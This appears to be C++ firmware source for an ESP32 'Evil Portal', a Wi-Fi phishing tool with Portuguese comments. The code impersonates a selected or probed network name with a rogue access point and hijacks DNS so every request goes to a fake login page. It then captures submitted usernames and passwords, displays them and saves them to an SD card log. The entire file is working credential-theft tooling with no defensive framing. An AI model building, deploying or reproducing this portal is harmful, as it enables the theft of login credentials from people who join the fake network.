#include <ESPAsyncWebServer.h>
#include "WiFiScan.h"
#include "EvilPortal.h"
#include <vector>
#include <String>
#include <lvgl.h>
#include <Arduino.h>
#include "lang_var.h"

AsyncWebServer server(80);

// Implementação do CaptiveRequestHandler para redirecionar todo o tráfego
class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request) {
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse(302, "text/plain", "");
    response->addHeader("Location", "http://" + WiFi.softAPIP().toString());
    request->send(response);
  }
};

EvilPortal::EvilPortal() {}

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;

  html_files.clear();

#ifdef HAS_SD
  if (sd_obj.supported) {
    sd_obj.listDir("/");
    Serial.println("Portal do Mal encontrou " + String(html_files.size()) + " arquivos HTML.");
  }
#endif
}

bool EvilPortal::begin(const std::vector<SSID>& ssids, const std::vector<AccessPoint>& access_points) {
  if (!this->setAP(ssids, access_points)) {
    Serial.println("Falha ao configurar o AP");
    return false;
  }
  if (!this->setHtml()) {
    Serial.println("Falha ao configurar o HTML");
    return false;
  }

  startPortal();
  return true;
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {
  // Define a rota raiz para enviar a página HTML
  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
    Serial.println("Cliente conectado");
    this->sendToDisplay("Cliente conectado ao servidor");
  });

  // Define a rota /get para receber as credenciais do formulário
  server.on("/get", HTTP_POST, [this](AsyncWebServerRequest *request) {
    String user = "";
    String pass = "";

    // Verifica se o parâmetro "username" foi enviado
    if (request->hasParam("username", true)) {
      user = request->getParam("username", true)->value();
    }

    // Verifica se o parâmetro "password" foi enviado
    if (request->hasParam("password", true)) {
      pass = request->getParam("password", true)->value();
    }

    // Se algum dos campos foi preenchido, salva as credenciais
    if (user != "" || pass != "") {
      this->user_name = user;
      this->password = pass;
      this->name_received = true;
      this->password_received = true;
      Serial.println("Credenciais recebidas: " + user + ":" + pass);
    }

    // Redireciona o cliente de volta para a página inicial após o envio das credenciais
    request->send(200, "text/html", "<html><head><script>setTimeout(function(){ window.location.href = '/'; }, 100);</script></head><body><h1>Sucesso! Redirecionando...</h1></body></html>");
  });

  Serial.println("Servidor web configurado.");
}

void EvilPortal::setHtmlFromSerial() {
  Serial.println("Definindo HTML a partir da serial...");
  String htmlContent = Serial.readString();
  strncpy(index_html, htmlContent.c_str(), MAX_HTML_SIZE);
  this->has_html = true;
  this->using_serial_html = true;
  Serial.println("HTML definido via serial.");
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    Serial.println("Usando HTML previamente definido via serial.");
    return true;
  }
  Serial.println("Configurando HTML do arquivo: /" + this->target_html_name);
#ifdef HAS_SD
  if (!sd_obj.supported) {
    Serial.println("Cartao SD nao suportado.");
    return false;
  }
  File html_file = sd_obj.getFile("/" + this->target_html_name);
#else
  File html_file;
#endif

  if (!html_file || html_file.isDirectory()) {
    this->sendToDisplay("Erro: Nao foi possivel encontrar /" + this->target_html_name);
    Serial.println("Erro: Nao foi possivel encontrar /" + this->target_html_name);
    return false;
  }

  if (html_file.size() > MAX_HTML_SIZE) {
    this->sendToDisplay("Erro: O arquivo HTML e muito grande.");
    Serial.println("Erro: O arquivo HTML é muito grande. Limite: " + (String)MAX_HTML_SIZE);
    return false;
  }

  size_t bytesRead = html_file.readBytes(index_html, MAX_HTML_SIZE);
  index_html[bytesRead] = '\0'; // Null-terminate the string
  html_file.close();

  this->has_html = true;
  Serial.println("HTML definido com sucesso.");
  return true;
}

bool EvilPortal::setAP(const std::vector<SSID>& ssids, const std::vector<AccessPoint>& access_points) {
  String ap_config = "";

  // Prioridade 1: APs selecionados na GUI
  if (!access_points.empty()) {
    for (int i = 0; i < access_points.size(); i++) {
      if (access_points[i].selected) {
        ap_config = access_points[i].essid;
        Serial.println("Usando AP selecionado: " + ap_config);
        break;
      }
    }
  }

  // Prioridade 2: SSIDs na lista (geralmente de um probe request)
  if (ap_config == "" && !ssids.empty()) {
    ap_config = ssids[0].essid;
    Serial.println("Usando SSID da lista de probes: " + ap_config);
  }

  // Prioridade 3: Fallback para um nome padrão
  if (ap_config == "") {
    ap_config = "LCA_Evil_Portal";
    Serial.println("Nenhum AP selecionado ou SSID encontrado. Usando AP padrao: " + ap_config);
  }

  if (ap_config.length() > 31) {
    ap_config = ap_config.substring(0, 31);
  }

  strncpy(apName, ap_config.c_str(), 32);
  this->has_ap = true;
  Serial.println("Configuracao do AP definida: " + String(apName));
  return true;
}

void EvilPortal::startAP() {
  const IPAddress AP_IP(10, 0, 0, 1);
  const IPAddress SUBNET(255, 255, 255, 0);

  Serial.print("Iniciando AP: ");
  Serial.println(apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, SUBNET);
  WiFi.softAP(apName);

  this->sendToDisplay("AP " + String(apName) + " iniciado");
  Serial.print("Endereco IP do AP: ");
  Serial.println(WiFi.softAPIP());

  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
  this->sendToDisplay("Portal do Mal PRONTO");
}

void EvilPortal::startPortal() {
  this->startAP();
  this->runServer = true;
}

void EvilPortal::sendToDisplay(String msg) {
#ifdef HAS_SCREEN
  display_obj.display_buffer->push_back(msg);
#endif
}

bool EvilPortal::runMain(uint8_t scan_mode) {
  if (runServer) {
    dnsServer.processNextRequest();
  }

  if (this->name_received && this->password_received) {
      this->name_received = false;
      this->password_received = false;
      String log_data = "U: " + this->user_name + " P: " + this->password;
      Serial.println("[+] Credenciais Capturadas: " + log_data);
      this->sendToDisplay(log_data);

      // Salvar no SD Card
      #ifdef HAS_SD
      if(sd_obj.supported) {
        File dataFile = sd_obj.getFile("/LCA_EvilPortal_logs.txt");
        if(dataFile) {
            dataFile.println(log_data);
            dataFile.close();
            Serial.println("Credenciais salvas no SD Card.");
        }
      }
      #endif
  }
  return true;
}
